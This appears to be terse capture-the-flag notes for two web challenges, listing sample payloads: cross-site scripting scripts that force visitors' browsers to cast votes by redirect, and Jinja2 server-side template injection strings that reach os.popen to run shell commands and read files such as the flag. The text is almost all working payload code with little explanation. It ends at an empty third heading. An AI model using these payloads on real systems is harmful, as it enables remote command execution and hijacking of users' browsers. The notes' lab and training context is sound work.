### 1. vote challenge. 

>  Everyone can register and create their own profile. The main page has a public comment section. The comment will be DOM XSS enabled, and vote by calling your profile vote/ca463d3bf6f74c59bf757d500b1fcf89. A winner will be announced every 5 minutes. A flag will be printed on the profile with the most votes.

#### sample payloads. 
```
<script> document.location = 'http://localhost:1339/vote/ca463d3bf6f74c59bf757d500b1fcf89'</script>
function sleep(ms) {

    return new Promise(resolve => setTimeout(resolve, ms));

}
```

```
<script>
async function go(){

await sleep(20);

if (document.cookie.indexOf('user') > -1 ) {
  window.location.replace('http://localhost:1339/vote/be1c1a788bd04360924ccb53709a30eb');
}


}

go();
</script>
```


```
reamb<script>let uuid; for (let a of document.querySelectorAll("a")) { if(a.textContent.includes('reamb')) uuid = a.href.split('/')[4] }; location.href = '/vote/' + uuid</script>
```

### 2. ssti web
> payload should be no longer than 48 chars. 
#### sample payloads. 
http://localhost/ssti?query={{g.__class__.__base__.__subclasses__()[92]}}
```
url_for.__globals__.os.popen("ls").read()
{{url_for.__globals__.os.popen("od t*").read()}}
g.pop.__globals__.os.popen("od f*").read()   # reading flag
config.__init__.__globals__.os.popen("nl * | od -b").read()
```

 ### 3.